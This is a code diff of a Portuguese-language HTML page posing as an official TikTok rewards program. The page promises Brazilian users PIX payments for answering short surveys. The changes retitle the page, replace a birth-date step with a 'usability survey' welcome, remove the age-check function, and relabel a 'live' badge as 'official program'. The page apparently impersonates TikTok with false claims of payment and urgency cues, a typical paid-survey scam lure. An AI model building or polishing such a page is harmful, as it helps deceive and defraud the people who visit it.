@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verificação de Acesso - TikTok</title>
+  <title>TikTok Recompensas & Pay</title>
   <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
   <style>
     @keyframes slideDown {
@@ -34,7 +34,6 @@
       -ms-overflow-style: none;
       scrollbar-width: none;
     }
-    /* Estilo para ocultar o conteúdo original antes da verificação */
     .locked-app-content {
       display: none !important;
     }
@@ -43,10 +42,10 @@
 <body class="bg-slate-50 min-h-screen text-slate-800 flex flex-col justify-between selection:bg-pink-500 selection:text-white font-sans relative">
 
   <!-- ========================================== -->
-  <!-- TELA DE ENTRADA: VERIFICAÇÃO DE IDADE -->
+  <!-- TELA DE ENTRADA: VERIFICAÇÃO DE IDADE (ÚNICA) -->
   <!-- ========================================== -->
   <div id="initial-age-gate" class="fixed inset-0 z-50 bg-slate-900/40 backdrop-blur-sm flex items-center justify-center p-4">
-    <div class="bg-white rounded-3xl p-6 shadow-2xl max-w-md w-full border border-slate-100 text-center space-y-5 animate-in fade-in zoom-in duration-300">
+    <div class="bg-white rounded-3xl p-6 shadow-2xl max-w-md w-full border border-slate-100 text-center space-y-5">
       <div class="bg-pink-50 border border-pink-100 rounded-2xl p-3 text-center space-y-1">
         <div class="flex items-center justify-center space-x-2 text-xs font-bold text-pink-600 uppercase tracking-wider">
           <span class="w-2 h-2 rounded-full bg-pink-500 animate-ping"></span>
@@ -79,7 +78,7 @@
   </div>
 
   <!-- ========================================== -->
-  <!-- TODO O SEU CONTEÚDO ORIGINAL ABAIXO (BLOQUEADO INICIALMENTE) -->
+  <!-- APLICAÇÃO PRINCIPAL COMPLETA -->
   <!-- ========================================== -->
   <div id="main-application-wrapper" class="locked-app-content flex flex-col min-h-screen justify-between">
 
@@ -116,35 +115,41 @@
   <!-- Container Principal -->
   <main class="w-full max-w-md mx-auto p-4 flex-1 flex flex-col justify-center space-y-6">
 
-    <!-- ETAPA 1: Verificação Interna de Idade -->
+    <!-- ETAPA 1: Apresentação Institucional / Boas-vindas -->
     <div id="step-1" class="step-view bg-white rounded-3xl p-6 shadow-xl shadow-slate-100 border border-slate-100 text-center space-y-5">
       <div class="bg-pink-50 border border-pink-100 rounded-2xl p-3 text-center space-y-1">
         <div class="flex items-center justify-center space-x-2 text-xs font-bold text-pink-600 uppercase tracking-wider">
           <span class="w-2 h-2 rounded-full bg-pink-500 animate-ping"></span>
-          <span>AO VIVO • VAGAS POR REGIÃO</span>
+          <span>PROGRAMA OFICIAL • VAGAS POR REGIÃO</span>
         </div>
         <p class="text-sm font-extrabold text-slate-800">
-          O TikTok está pagando usuários <span id="user-location-text" class="text-pink-600 underline decoration-pink-300">do Brasil</span> para responder pesquisas!
+          O TikTok está selecionando usuários <span id="user-location-text" class="text-pink-600 underline decoration-pink-300">do Brasil</span> para validação de experiência!
         </p>
       </div>
 
       <div class="w-16 h-16 bg-pink-50 text-pink-500 rounded-2xl mx-auto flex items-center justify-center text-3xl shadow-inner">
-        🔞
+        📱
       </div>
       <div class="space-y-2">
-        <h1 class="text-2xl font-bold tracking-tight text-slate-900">Verificação de Idade</h1>
-        <p class="text-sm text-slate-500 leading-relaxed">Para participar do programa oficial de pesquisas remuneradas do TikTok na sua região, confirme sua data de nascimento.</p>
+        <h1 class="text-2xl font-bold tracking-tight text-slate-900">Pesquisa de Usabilidade</h1>
+        <p class="text-sm text-slate-500 leading-relaxed">Responda a 5 perguntas rápidas sobre o seu hábito de consumo de vídeos para validar sua participação e acumular créditos na plataforma.</p>
       </div>
 
-      <div class="bg-slate-50 border border-slate-100 p-4 rounded-2xl text-left space-y-2">
-        <label class="text-xs font-bold text-slate-700 uppercase tracking-wider block">Data de Nascimento</label>
-        <input type="date" id="birth-date-input" class="w-full bg-white border border-slate-200 rounded-xl px-4 py-3.5 text-sm font-bold text-slate-800 focus:outline-none focus:border-pink-500 transition-all shadow-xs cursor-pointer">
-        <p class="text-[11px] text-slate-400">Exigido para autorização de transferência via PIX (maior de 18 anos).</p>
+      <div class="bg-slate-50 border border-slate-100 p-4 rounded-2xl text-left space-y-2.5">
+        <div class="flex items-center gap-2 text-xs font-semibold text-slate-700">
+          <span class="text-emerald-500 font-bold">✓</span> Tempo estimado: Menos de 2 minutos
+        </div>
+        <div class="flex items-center gap-2 text-xs font-semibold text-slate-700">
+          <span class="text-emerald-500 font-bold">✓</span> Recompensa creditada por etapa
+        </div>
+        <div class="flex items-center gap-2 text-xs font-semibold text-slate-700">
+          <span class="text-emerald-500 font-bold">✓</span> Transferência instantânea via PIX
+        </div>
       </div>
 
       <div class="space-y-3">
-        <button onclick="verifyBirthDate()" class="w-full bg-pink-600 hover:bg-pink-700 active:scale-[0.98] transition-all text-white font-semibold py-3.5 px-4 rounded-xl shadow-md shadow-pink-200 cursor-pointer">
-          Avançar
+        <button onclick="switchStep(2)" class="w-full bg-pink-600 hover:bg-pink-700 active:scale-[0.98] transition-all text-white font-semibold py-3.5 px-4 rounded-xl shadow-md shadow-pink-200 cursor-pointer">
+          Iniciar Pesquisa ›
         </button>
       </div>
     </div>
@@ -759,10 +764,6 @@
       document.getElementById('initial-age-gate').style.display = 'none';
       const mainApp = document.getElementById('main-application-wrapper');
       mainApp.classList.remove('locked-app-content');
-      
-      // Copia a data informada para o input interno da etapa 1 se necessário
-      const internalInput = document.getElementById('birth-date-input');
-      if (internalInput) internalInput.value = dateInput;
     }
 
     function scrollToShareSection() {
@@ -938,24 +939,6 @@
       } else {
         stopVideoPlayer();
       }
-    }
-
-    function verifyBirthDate() {
-      const dateInput = document.getElementById('birth-date-input').value;
-      if (!dateInput) {
-        alert("Por favor, selecione sua data de nascimento.");
-        return;
-      }
-      const today = new Date();
-      const birthDate = new Date(dateInput);
-      let age = today.getFullYear() - birthDate.getFullYear();
-      const m = today.getMonth() - birthDate.getMonth();
-      if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) age--;
-      if (age < 18) {
-        alert("Você precisa ter mais de 18 anos para participar.");
-        return;
-      }
-      switchStep(2);
     }
 
     function selectAnswer(questionNum, btnElement) {
